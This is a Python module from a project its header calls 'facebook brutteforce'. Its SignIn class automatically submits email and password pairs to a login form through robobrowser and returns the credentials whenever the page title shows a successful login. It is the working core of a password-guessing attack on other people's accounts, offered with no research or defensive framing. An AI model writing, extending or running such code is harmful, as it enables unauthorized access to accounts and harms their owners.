'''
 Author: Gabriel Vieira Nunes
 Project: facebook brutteforce
'''

from domain.entities.login import Login
from domain.entities.url import Url
import werkzeug
werkzeug.cached_property = werkzeug.utils.cached_property
import robobrowser
import re


class SignIn():

	def __init__(self, url, title):

		self._Url = Url(url, title)
		
	def connect(self, email, password):

		_Login = Login(email, password)

		browser = robobrowser.RoboBrowser(history=True, parser='html.parser')
		browser.open(self._Url.getUrl)

		form = browser.get_form(id='login_form')
		form['email'].value = _Login.getEmail
		form['pass'].value = _Login.getPassword
		browser.submit_form(form, submit=form['login'])

		redirect_title = re.compile('<title>(.*?)</title>').search(str(browser.parsed)).group(1)

		if (redirect_title == self._Url.getLoggedin_Title):
			return 'Username: {}\nPassword: {}'.format(form['email'].value, form['pass'].value)

		else:
			return False

if __name__ == '__main__':
	si = SignIn('', '')
